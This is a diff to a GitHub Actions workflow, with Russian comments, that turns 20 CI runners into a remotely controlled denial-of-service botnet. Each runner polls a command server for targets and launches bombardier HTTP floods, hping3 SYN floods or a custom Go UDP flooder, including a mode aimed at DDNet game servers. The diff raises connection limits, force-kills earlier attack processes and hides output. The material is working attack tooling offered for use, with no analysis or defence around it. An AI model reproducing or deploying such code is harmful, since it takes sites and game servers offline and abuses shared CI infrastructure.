@@ -11,37 +11,45 @@ jobs:
         runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      - name: Checkout Repository
+      - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Setup Tools
+      - name: Setup and Compile
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl jq
           
-          # Установка bombardier
+          # Установка лимитов на открытые файлы (важно для многих соединений)
+          sudo prlimit --pid $$ --nofile=65535:65535
+
+          # Установка Bombardier
           wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           
-          # Компиляция своего файла
+          # Компиляция
           if [ -f "bombarida.go" ]; then
             go build -o bombarida_bin bombarida.go
             chmod +x bombarida_bin
-            echo "SUCCESS: bombarida compiled."
           else
-            echo "ERROR: bombarida.go not found in repo!"
-            exit 1
+            echo "Файл bombarida.go не найден!" && exit 1
           fi
 
       - name: Control Loop
         env:
           URL: "https://me5years.alwaysdata.net/index.php?action=get"
         run: |
-          LAST_ID=$(curl -s "$URL" | jq -r '.id // 0')
-          echo "READY. WAITING FOR COMMAND... (START ID: $LAST_ID)"
+          # Разрешаем скрипту продолжать работу при ошибках команд
+          set +e
+          # Увеличиваем лимиты для текущего процесса
+          ulimit -n 65535
+          
+          LAST_ID=$(curl -s --connect-timeout 5 "$URL" | jq -r '.id // 0')
+          echo "STARTED. WAITING FOR COMMAND... (START ID: $LAST_ID)"
           
           while true; do
-            DATA=$(curl -s "$URL")
+            # Запрашиваем данные с таймаутом
+            DATA=$(curl -s --connect-timeout 5 "$URL")
+            
             if echo "$DATA" | jq -e . >/dev/null 2>&1; then
               ID=$(echo "$DATA" | jq -r '.id // 0')
 
@@ -52,23 +60,23 @@ jobs:
                 PORT=$(echo "$DATA" | jq -r '.port')
                 CONNS=$(echo "$DATA" | jq -r '.conns // 100')
 
-                sudo killall bombardier hping3 bombarida_bin 2>/dev/null || true
+                # Жесткая очистка старых процессов
+                sudo killall -9 bombardier hping3 bombarida_bin 2>/dev/null
+                sleep 1
                 
                 if [ "$METHOD" == "stop" ]; then
-                  echo ">>> STOPPED <<<"
+                  echo "[ID $ID] >>> СТОП <<<"
                 else
-                  echo "=================================================="
-                  echo "RUNNING: $METHOD | TARGET: $TARGET | ID: $ID"
-                  echo "=================================================="
+                  echo "[ID $ID] >>> ЗАПУСК: $METHOD на $TARGET:$PORT (Conns: $CONNS) <<<"
 
                   if [ "$METHOD" == "http" ]; then
-                    while true; do bombardier -c 1000 -d 3600s --http2 -l "$TARGET?cache=$RANDOM"; done &
+                    bombardier -c 1000 -d 3600s --http2 -l "$TARGET?cache=$RANDOM" > /dev/null &
                   elif [ "$METHOD" == "tcp" ]; then
-                    sudo hping3 --flood -S -p $PORT $TARGET &
+                    sudo hping3 --flood -S -p $PORT $TARGET > /dev/null 2>&1 &
                   elif [ "$METHOD" == "udp" ]; then
-                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -c $CONNS -d 3600s &
+                    ./bombarida_bin -addr "${TARGET}:${PORT}" -c $CONNS -d 3600s &
                   elif [ "$METHOD" == "udp-ddnet" ]; then
-                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -ddnet-info -c $CONNS -d 3600s &
+                    ./bombarida_bin -addr "${TARGET}:${PORT}" -ddnet-info -c $CONNS -d 3600s &
                   fi
                 fi
               fi
